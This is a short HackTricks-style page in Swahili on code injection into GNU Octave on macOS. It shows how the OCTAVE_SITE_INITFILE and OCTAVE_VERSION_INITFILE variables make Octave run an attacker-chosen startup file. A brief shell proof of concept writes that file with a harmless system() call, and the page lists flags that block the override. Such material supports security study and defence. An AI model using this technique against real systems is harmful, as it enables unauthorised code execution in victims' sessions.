# Injection ya Applications za GNU Octave kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave hutekeleza faili kadhaa zilizo na amri halali za Octave wakati wa kuanzisha. `OCTAVE_SITE_INITFILE` hubatilisha faili ya uanzishaji ya site-wide, na `OCTAVE_VERSION_INITFILE` hubatilisha faili mahususi ya toleo, hivyo kuruhusu variable yoyote kati ya hizi kuelekeza upya utekelezaji wa kiotomatiki kwenye faili ambayo mshambuliaji anaweza kusoma.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` huruka faili za mtumiaji pekee kama vile `~/.octaverc`; **haizuii** override ya site-file iliyo hapo juu. Tumia `--no-site-file` kwa site files au `--norc` / `-f` kuzima faili zote za uanzishaji.<sup>[[2]](#references)</sup>

## References

- [1] [Faili za Uanzishaji za GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [2] [Chaguo za Mstari wa Amri za GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
